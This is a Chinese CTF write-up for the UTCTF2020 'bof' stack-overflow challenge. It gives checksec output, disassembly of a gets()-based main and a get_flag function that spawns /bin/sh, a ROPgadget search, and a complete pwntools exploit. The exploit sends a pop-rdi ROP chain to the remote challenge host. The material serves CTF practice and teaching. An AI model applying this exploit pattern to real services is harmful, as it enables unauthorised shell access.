
# [原创]UTCTF2020-bof 栈溢出

```
root@gavin:/home/gavin/UTCTF2020# checksec ./pwnable

[*] '/home/gavin/UTCTF2020/pwnable'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```

```
int __cdecl main(int argc, const char **argv, const char **envp)

{

  char v4; // [sp+0h] [bp-70h]@1



  puts("I really like strings! Please give me a good one!");

  gets(&v4, argv);

  puts("Thanks for the string");

  return 1;

}



.text:00000000004005EA                 public get_flag

.text:00000000004005EA get_flag        proc near

.text:00000000004005EA

.text:00000000004005EA var_14          = dword ptr -14h

.text:00000000004005EA path            = qword ptr -10h

.text:00000000004005EA var_8           = qword ptr -8

.text:00000000004005EA

.text:00000000004005EA                 push    rbp

.text:00000000004005EB                 mov     rbp, rsp

.text:00000000004005EE                 sub     rsp, 20h

.text:00000000004005F2                 mov     [rbp+var_14], edi

.text:00000000004005F5                 cmp     [rbp+var_14], 0DEADBEEFh

.text:00000000004005FC                 jnz     short loc_400628 ; if( a1 = 'deadbeef')

.text:00000000004005FE                 mov     [rbp+path], offset aBinSh ; "/bin/sh"

.text:0000000000400606                 mov     [rbp+var_8], 0

.text:000000000040060E                 mov     rax, [rbp+path]

.text:0000000000400612                 lea     rcx, [rbp+path]

.text:0000000000400616                 mov     edx, 0          ; envp

.text:000000000040061B                 mov     rsi, rcx        ; argv

.text:000000000040061E                 mov     rdi, rax        ; path

.text:0000000000400621                 call    _execve

.text:0000000000400626                 jmp     short locret_400629

.text:0000000000400628                 nop

.text:0000000000400629                 leave

.text:000000000040062A                 retn

.text:000000000040062A get_flag          endp

```

这是一个简单的栈溢出pwn，在程序中还能找到一个`get_flag`函数，并且程序开了NX保护，所以解法是将`ret`的位置改成`get_flag`函数的地址，问题是`get_flag`中还有一个`if`判断，需要将`'deadbeef'`放到栈中，再找个`POP RDI`指令，因此需要用到`ROPgadget`

```
root@gavin:/home/gavin/UTCTF2020# ROPgadget --binary pwnable | grep "di"                               

0x0000000000400596 : cmp dword ptr [rdi], 0 ; jne 0x4005a5 ; jmp 0x400535                          

0x0000000000400595 : cmp qword ptr [rdi], 0 ; jne 0x4005a6 ; jmp 0x400536                          

0x000000000040050d : je 0x400528 ; pop rbp ; mov edi, 0x601048 ; jmp rax                          

0x000000000040055b : je 0x400570 ; pop rbp ; mov edi, 0x601048 ; jmp rax                              

0x0000000000400510 : mov edi, 0x601048 ; jmp rax                          

0x000000000040050f : pop rbp ; mov edi, 0x601048 ; jmp rax                 

0x0000000000400693 : pop rdi ; ret

```

`0x400693`似乎很理想，最终脚本如下

```
from pwn import *



#sh=process('./pwnable')

sh=remote('binary.utctf.live',9002)

payload="\xef\xbe\xad\xde"*30

payload+="\x93\x06\x40\x00\x00\x00\x00\x00"

payload+="\xef\xbe\xad\xde\x00\x00\x00\x00"

payload+="\xea\x05\x40\x00\x00\x00\x00\x00"

#context.terminal=["/usr/bin/tmux","split-window","-h"]

#gdb.attach(sh)

sh.sendline(payload)

sh.interactive()

```

小结：

事实证明就算是上手最快的栈溢出也不一定能保证全都能解决，所以基础真的很重要

我的`p64()`这个函数好像不怎么好用，每次都会变出一些奇怪的地址（难道是我太菜了？？o(╥﹏╥)o）

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2020-3-12 18:27 被pureGavin编辑，原因：

上传的附件：

- [pwnable](javascript:void(0);) （8.54kb，8次下载）
